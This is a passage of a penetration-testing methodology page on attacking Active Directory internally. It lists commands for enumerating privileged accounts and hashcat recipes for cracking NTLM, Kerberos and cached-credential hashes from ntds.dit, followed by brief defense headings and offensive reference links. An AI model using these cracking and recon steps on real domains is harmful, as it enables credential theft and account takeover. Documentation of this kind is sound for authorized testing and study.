+Then iterate through the list of privileged users, display their last password reset date (pwdLastSet) and sort it:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>while read user; do grep &quot;;${user};&quot; domain_users.grep; done &lt; privileged_users.txt | \
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>  grep -v ACCOUNT_DISABLED | sort -t &#39;;&#39; -k 10 | awk -F &#39;;&#39; &#39;{print $3, $10}&#39;
+</span></code></pre></div></p>
+<h4 id="users-with-non-expiring-passwords">Users with non-expiring passwords</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>grep DONT_EXPIRE_PASSWD domain_users.grep | grep -v ACCOUNT_DISABLED
+</span></code></pre></div>
+<h4 id="service-account-within-privileged-groups">Service account within privileged groups</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>net group &quot;Schema Admins&quot; /domain
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>net group &quot;Domain Admins&quot; /domain
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>net group &quot;Enterprise Admins&quot; /domain
+</span></code></pre></div>
+<h4 id="admincount-on-regular-users">AdminCount on regular users</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>jq -r &#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]&#39; domain_users.json
+</span></code></pre></div>
+<h2 id="data-exfiltration">Data-Exfiltration</h2>
+<p>Data exfiltration and DLP (Data Loss Prevention) bypass.</p>
+<h2 id="cracking-hashes">Cracking Hashes</h2>
+<ul>
+<li>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md</li>
+</ul>
+<h4 id="lm-hash">LM hash</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>hashcat -m 3000 -a 0 lm_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div>
+<h4 id="ntlm-hash">NTLM hash</h4>
+<p>Hashcat mask attack: A mask attack is an evolution over the brute-force and allows us to be more selective over the keyspace in certain positions.<br />
+- https://hashcat.net/wiki/doku.php?id=mask_attack
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>hashcat -m 1000 -a 3 ntds.dit ?u?l?l?l?l?d?d?d?d?s
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>hashcat -m 1000 -a 3 ntds.dit Company?d?d?d?s
+</span></code></pre></div></p>
+<p>Mask attack using custom charset for specific characters:
+- 1 ?d?s defines a custom charset (digits and specials).
+- ?u?l?l?l?l?l?l?l?1 is the mask, where ?1 is the custom charset.
+<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>hashcat.exe -a 3 -m 1000 ntds.dit -1 ?d?s ?u?l?l?l?l?l?l?l?1
+</span></code></pre></div></p>
+<p>Hashcat rule based cracking
+<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>hashcat -m 1000 -a 0 --username ntds.dit ../../wordlists/rockyou_2021.txt -r ../../wordlists/OneRuleToRuleThemAll.rule
+</span></code></pre></div></p>
+<p>Hashcat wordlist cracking
+<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>hashcat -m 1000 -a 0 --username ntds.dit ../../wordlists/rockyou_2021.txt
+</span></code></pre></div></p>
+<p>Hashcat using mask length and mask files (hcmask)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>lutzenfried@xec:~ cat ./test.hcmask
+</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a>?d?s,?u?l?l?l?l?1
+</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a>?d?s,?u?l?l?l?l?l?1
+</span><span id="__span-114-4"><a id="__codelineno-114-4" name="__codelineno-114-4" href="#__codelineno-114-4"></a>?d?s,?u?l?l?l?l?l?l?1
+</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#__codelineno-114-5"></a>?d?s,?u?l?l?l?l?l?l?l?1
+</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#__codelineno-114-6"></a>?d?s,?u?l?l?l?l?l?l?l?l?1
+</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#__codelineno-114-7"></a>?d?s,?u?l?l?l?l?l?l?l?1?1
+</span><span id="__span-114-8"><a id="__codelineno-114-8" name="__codelineno-114-8" href="#__codelineno-114-8"></a>?d?s,?u?l?l?l?l?l?l?1?1
+</span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9" href="#__codelineno-114-9"></a>?d?s,?u?l?l?l?l?l?1?1
+</span><span id="__span-114-10"><a id="__codelineno-114-10" name="__codelineno-114-10" href="#__codelineno-114-10"></a>?d?s,?u?l?l?l?l?1?1
+</span><span id="__span-114-11"><a id="__codelineno-114-11" name="__codelineno-114-11" href="#__codelineno-114-11"></a>?d?s,?u?l?l?l?1?1?1
+</span><span id="__span-114-12"><a id="__codelineno-114-12" name="__codelineno-114-12" href="#__codelineno-114-12"></a>?d?s,?u?l?l?l?l?1?1?1
+</span><span id="__span-114-13"><a id="__codelineno-114-13" name="__codelineno-114-13" href="#__codelineno-114-13"></a>?d?s,?u?l?l?l?l?l?1?1?1
+</span><span id="__span-114-14"><a id="__codelineno-114-14" name="__codelineno-114-14" href="#__codelineno-114-14"></a>?d?s,?u?l?l?l?l?l?l?1?1?1
+</span><span id="__span-114-15"><a id="__codelineno-114-15" name="__codelineno-114-15" href="#__codelineno-114-15"></a>?d?s,?u?l?l?l?l?l?1?1?1?1
+</span><span id="__span-114-16"><a id="__codelineno-114-16" name="__codelineno-114-16" href="#__codelineno-114-16"></a>?d?s,?u?l?l?l?l?1?1?1?1
+</span><span id="__span-114-17"><a id="__codelineno-114-17" name="__codelineno-114-17" href="#__codelineno-114-17"></a>?d?s,?u?l?l?l?1?1?1?1
+</span><span id="__span-114-18"><a id="__codelineno-114-18" name="__codelineno-114-18" href="#__codelineno-114-18"></a>?d?s,?u?l?l?1?1?1?1
+</span><span id="__span-114-19"><a id="__codelineno-114-19" name="__codelineno-114-19" href="#__codelineno-114-19"></a>?d?s,?u?l?1?1?1?1?1
+</span><span id="__span-114-20"><a id="__codelineno-114-20" name="__codelineno-114-20" href="#__codelineno-114-20"></a>?d?s,?u?l?l?1?1?1?1?1
+</span><span id="__span-114-21"><a id="__codelineno-114-21" name="__codelineno-114-21" href="#__codelineno-114-21"></a>?d?s,?u?l?l?l?1?1?1?1?1
+</span><span id="__span-114-22"><a id="__codelineno-114-22" name="__codelineno-114-22" href="#__codelineno-114-22"></a>?d?s,?u?l?l?l?l?1?1?1?1?1
+</span><span id="__span-114-23"><a id="__codelineno-114-23" name="__codelineno-114-23" href="#__codelineno-114-23"></a>
+</span><span id="__span-114-24"><a id="__codelineno-114-24" name="__codelineno-114-24" href="#__codelineno-114-24"></a>hashcat -m 1000 -a 3 -m 1000 NTDS.dit test.hcmask
+</span></code></pre></div></p>
+<h4 id="net-ntlmv1">Net-NTLMv1</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>hashcat -m 5500 -a 0 ntlmv1_hashes.txt ../../wordlists/rockyou_2021.txt 
+</span></code></pre></div>
+<h4 id="net-ntlmv2">Net-NTLMv2</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>hashcat -m 5600 -a 0 ntlmv2_hashes.txt ../../wordlists/rockyou_2021.txt 
+</span></code></pre></div>
+<h4 id="as-rep-roast-response-kerberos-5-as-rep-etype-23">AS-Rep Roast response (Kerberos 5 AS-REP etype 23)</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>hashcat -m 18200 -a 0 AS_REP_responses_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div>
+<h4 id="kerberoast-service-ticket">Kerberoast (Service Ticket)</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>hashcat -m 13100 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div>
+<h4 id="kerberos-5-tgs-aes128">Kerberos 5 TGS (AES128)</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>hashcat -m 19600 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div>
+<h4 id="kerberos-5-tgs-aes256">Kerberos 5 TGS (AES256)</h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>hashcat -m 19700 -a 0 TGS_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div>
+<h4 id="mscache-2-dcc2">MsCache 2 (DCC2)</h4>
+<p>Slow to be cracked due to PBKDF2 usage (<em>PBKDF2(HMAC-SHA1, 10240, DCC1, username</em>)
+- https://security.stackexchange.com/questions/30889/cracking-ms-cache-v2-hashes-using-gpu
+- https://webstersprodigy.net/2014/02/03/mscash-hash-primer-for-pentesters/
+<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>hashcat -m 2100 -a 0 DCC2_hashes.txt ../../wordlists/rockyou_2021.txt
+</span></code></pre></div></p>
+<p>Within Hashcat other mode such as Hybrid (6 and 7) and Combinator (1) can be used:
+- Combinator will combine 2 dictionaries/wordlists
+<div class="language-text highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>lutzenfried@xec:~ cat wordlist1.txt
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>wifi
+</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#__codelineno-122-3"></a>wireless
+</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#__codelineno-122-4"></a>
+</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5" href="#__codelineno-122-5"></a>lutzenfried@xec:~ cat wordlist2.txt
+</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6" href="#__codelineno-122-6"></a>pass
+</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7" href="#__codelineno-122-7"></a>password
+</span><span id="__span-122-8"><a id="__codelineno-122-8" name="__codelineno-122-8" href="#__codelineno-122-8"></a>
+</span><span id="__span-122-9"><a id="__codelineno-122-9" name="__codelineno-122-9" href="#__codelineno-122-9"></a># Some rule will be apply using -j and -k 
+</span><span id="__span-122-10"><a id="__codelineno-122-10" name="__codelineno-122-10" href="#__codelineno-122-10"></a>hashcat -m 22000 PSK_capture.hccap wordlist1.txt wordlist2.txt -j $- -k $23
+</span><span id="__span-122-11"><a id="__codelineno-122-11" name="__codelineno-122-11" href="#__codelineno-122-11"></a>
+</span><span id="__span-122-12"><a id="__codelineno-122-12" name="__codelineno-122-12" href="#__codelineno-122-12"></a>wifi-pass23
+</span><span id="__span-122-13"><a id="__codelineno-122-13" name="__codelineno-122-13" href="#__codelineno-122-13"></a>wireless-pass23
+</span><span id="__span-122-14"><a id="__codelineno-122-14" name="__codelineno-122-14" href="#__codelineno-122-14"></a>wifi-pass23
+</span><span id="__span-122-15"><a id="__codelineno-122-15" name="__codelineno-122-15" href="#__codelineno-122-15"></a>wifi-password23
+</span></code></pre></div></p>
+<ul>
+<li>Hybrid: This mode will apply a mask to specific wordlist
+<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>lutzenfried@xec:~ cat wordlist.txt
+</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a>Pass
+</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a>Password
+</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#__codelineno-123-4"></a>Azerty
+</span><span id="__span-123-5"><a id="__codelineno-123-5" name="__codelineno-123-5" href="#__codelineno-123-5"></a>
+</span><span id="__span-123-6"><a id="__codelineno-123-6" name="__codelineno-123-6" href="#__codelineno-123-6"></a>hashcat.exe -a 6 -m 1000 NTDS.dit wordlist.txt ?d?d?d?d
+</span><span id="__span-123-7"><a id="__codelineno-123-7" name="__codelineno-123-7" href="#__codelineno-123-7"></a>Pass0000
+</span><span id="__span-123-8"><a id="__codelineno-123-8" name="__codelineno-123-8" href="#__codelineno-123-8"></a>Password0000
+</span><span id="__span-123-9"><a id="__codelineno-123-9" name="__codelineno-123-9" href="#__codelineno-123-9"></a>Azerty0000
+</span></code></pre></div></li>
+</ul>
+<p><a href="https://bytesdarkly.com/2014/08/generating-keyboard-walks/">Keyboard walks</a> wordlists:<br />
+- https://github.com/hashcat/kwprocessor.git
+- https://github.com/Rich5/Keyboard-Walk-Generators
+<div class="language-text highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>lutzenfried@xec:~ /tmp/kwprocessor ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-10-max-3-direction-changes.route -o key_walk_en_us_10_max.txt
+</span></code></pre></div></p>
+<h2 id="reporting-collaborative">Reporting / Collaborative</h2>
+<h3 id="plumhound">PlumHound</h3>
+<ul>
+<li>https://www.blackhillsinfosec.com/plumhound-reporting-engine-for-bloodhoundad/</li>
+<li>https://github.com/plumhound</li>
+</ul>
+<h3 id="pwndoc">Pwndoc</h3>
+<h3 id="password-audit-reporting">Password audit reporting</h3>
+<ul>
+<li>https://github.com/clr2of8/DPAT
+<div class="language-text highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>dpat.py -n ntds.dit -c hashcat.potfile -g &quot;Domain Admins.txt&quot; &quot;Enterprise Admins.txt&quot;
+</span></code></pre></div></li>
+</ul>
+<p><img src="./images/dpat.png" width="250"/></p>
+<h2 id="defenses">Defenses</h2>
+<h3 id="restricted-admin-mode">Restricted Admin Mode</h3>
+<ul>
+<li>https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx</li>
+<li>https://labs.withsecure.com/publications/undisable</li>
+<li></li>
+</ul>
+<h3 id="windows-defender-antivirus">Windows Defender Antivirus</h3>
+<h3 id="applocker">AppLocker</h3>
+<ul>
+<li>https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75</li>
+</ul>
+<p><strong>Rules</strong>: Are defined and control execution of the followings items:
+- Applications
+- Scripts
+- Packaged Applications
+- Installers
+- DLL</p>
+<p><strong>Conditions</strong>: Are based on the followings filters:
+- Publisher (Ex: Software signed by valid vendor)
+- Path
+- File hash</p>
+<p>--&gt; Finally : <strong>Allow</strong> and <strong>Deny</strong> actions can be assigned to specific user/group.</p>
+<h3 id="windows-defender-application-control-wdac">Windows Defender Application Control (WDAC)</h3>
+<ul>
+<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/wdac-and-applocker-overview</li>
+</ul>
+<h3 id="windows-defender-advanced-threat-protection-atp">Windows Defender Advanced Threat Protection (ATP)</h3>
+<h3 id="windows-defender-exploit-guard">Windows Defender : Exploit Guard</h3>
+<h3 id="windows-defender-application-guard">Windows Defender : Application Guard</h3>
+<h3 id="windows-defender-device-guard">Windows Defender : Device Guard</h3>
+<h3 id="windows-defender-credential-guard">Windows Defender : Credential Guard</h3>
+<h2 id="resources">Resources</h2>
+<h4 id="steve-syfuhs-blog">Steve Syfuhs blog</h4>
+<ul>
+<li>https://syfuhs.net/</li>
+</ul>
+<h4 id="red-team-cheatsheet">Red Team Cheatsheet</h4>
+<ul>
+<li>https://0xsp.com/offensive/red-team-cheatsheet/</li>
+</ul>
+<h4 id="ocd-ad-mind-map">OCD - AD Mind Map</h4>
+<ul>
+<li>https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</li>
+</ul>
+<h4 id="petitpotam-and-adcs">PetitPotam and ADCS</h4>
+<ul>
+<li>https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services</li>
+</ul>
+<h4 id="active-directory-exploitation-cheatsheet">Active Directory Exploitation cheatsheet</h4>
+<ul>
+<li>https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</li>
+<li>https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition</li>
+<li></li>
+</ul>
+<h4 id="attacking-active-directory">Attacking Active Directory</h4>
+<ul>
+<li>https://www.youtube.com/watch?v=MIt-tIjMr08</li>
+</ul>
+<h4 id="kerberos-delegation_2">Kerberos Delegation</h4>
+<ul>
+<li>https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</li>
+<li>https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf</li>
+<li>https://adsecurity.org/?p=4056</li>
+<li>https://adsecurity.org/?p=1667</li>
+<li>https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c</li>
+<li>https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</li>
+<li>https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783</li>
+</ul>
+<h4 id="exceptional-blog-posts-regarding-windows-authenticationcredentialsrdp">Exceptional blog posts regarding Windows Authentication/Credentials/RDP</h4>
+<ul>
+<li>https://syfuhs.net/</li>
+</ul>
+<h4 id="windows-logon-types">Windows Logon Types</h4>
+<ul>
+<li>https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them#viewer-732hk</li>
+</ul>
+<h4 id="windows-name-pipes">Windows Name Pipes</h4>
+<h4 id="com-dcom">COM / DCOM</h4>
+<h4 id="powershell-without-powershell">PowerShell Without PowerShell</h4>
+<ul>
+<li>https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/</li>
+<li>https://www.ired.team/offensive-security/code-execution/powershell-without-powershell</li>
+<li>https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628</li>
+<li>https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/</li>
+<li>https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell/</li>
+<li>https://www.optiv.com/explore-optiv-insights/blog/unmanaged-powershell-binaries-and-endpoint-protection</li>
+<li>https://github.com/leechristensen/UnmanagedPowerShell</li>
+</ul>
+<p>Tools:
+- <a href="https://github.com/fullmetalcache/PowerLine">PowerLine</a>
+- <a href="https://github.com/Ben0xA/nps">NPS - Not PowerShell</a>
+- <a href="https://github.com/p3nt4/PowerShdll">PowerShdll</a>
+- <a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">PowerLessShell</a>
+- <a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">Nopowershell</a>
+- <a href="">SyncAppvPublishingServer</a></p>
+<ul>
+<li>https://h4ms1k.github.io/Red_Team_Active_Directory/#</li>
+<li>https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html</li>
+<li>https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/</li>
+<li>https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/amp/</li>
+<li>https://github.com/threatexpress/red-team-scripts</li>
+<li>https://www.thehacker.recipes/ad/recon</li>
+<li>https://www.praetorian.com/blog/red-team-local-privilege-escalation-writable-system-path-privilege-escalation-part-1/</li>
+<li>https://www.praetorian.com/blog/red-team-privilege-escalation-rbcd-based-privilege-escalation-part-2/</li>
+<li>https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/</li>
+<li>https://github.com/tevora-threat/SharpView</li>
+<li>https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/</li>
+<li>Delegation</li>
+<li>Printnightmare</li>
+<li>Proxylogon,proxyshell,notproxyshell
+https://www.praetorian.com/blog/reproducing-proxylogon-exploit/</li>
+<li>Trust, forest</li>
+<li>checker for internal OWA, Exchange vuln</li>
+<li>Exchange vuln privexchange.py</li>
+<li>PAC</li>
+<li>Skeleton key</li>
+<li>Sam Account Name spoofing</li>
+<li>LAPS and LAPS bypass
+https://www.praetorian.com/blog/obtaining-laps-passwords-through-ldap-relaying-attacks/</li>
+<li>script to enum domain group, protected user unauthenticated (bash + python projects)</li>
+<li>https://pentestbook.six2dez.com/post-exploitation/windows/ad</li>
+<li>ldap signing</li>
+<li>Spooler</li>
+<li>petitpotam
+https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/
+https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
+https://www.ravenswoodtechnology.com/protect-your-windows-network-from-the-petitpotam-exploit/</li>
+<li>ADCS
+https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#domain-escalation-via-certificates
+https://www.youtube.com/watch?v=-KuCaJXSyXA
+https://github.com/ly4k/Certipy</li>
+<li>adsecurity all</li>
+<li>Wdigest</li>
+<li>windows authentication cache (HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\CachedLogonsCount)</li>
+<li>xfreerdp tool</li>
+<li>Service accounts with interactive logon</li>
+<li>Permissive Active Directory Domain Services https://blog.netspi.com/exploiting-adidns/</li>
+<li>DHCP spoofing</li>
+<li>ARP spoofing</li>
+<li>Pypykatz</li>
+<li>Spraykatz</li>
+<li>VLAN hopping</li>
+<li>STP - network layer attacks</li>
+<li>SNMP default</li>
+<li>Potato family : https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all</li>
+<li>SMTP</li>
+<li>ACL/DACL exploitation</li>
+<li>Owner https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#owns</li>
+<li>Hekatomb tool (https://github.com/Processus-Thief/HEKATOMB)</li>
+<li>SCCM</li>
+<li>https://labs.nettitude.com/blog/introducing-malsccm/</li>
+<li>https://www.scribd.com/document/204221426/Owning-One-Rule-All-v2#</li>
+<li>https://enigma0x3.net/2016/02/29/offensive-operations-with-powersccm/</li>
+<li>
+<p>https://harmj4.rssing.com/chan-30881824/article40.html</p>
+</li>
+<li>
+<p>Protections
+LAPS, JEA, WSL, RBCD, WDAC, ASR, AWL,Kerberos Armoring, Compound Authentication, RunasPPL, RedForest (PAM),  Credential Guard, CLM, virtualization </p>
+</li>
+<li>https://www.sstic.org/2017/presentation/administration_en_silo/</li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../macos%20intrusion/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../macos%20intrusion/" class="btn btn-xs btn-link">
+        macOS intrusion
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../external/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../external/" class="btn btn-xs btn-link">
+        External
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/methods/internal.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
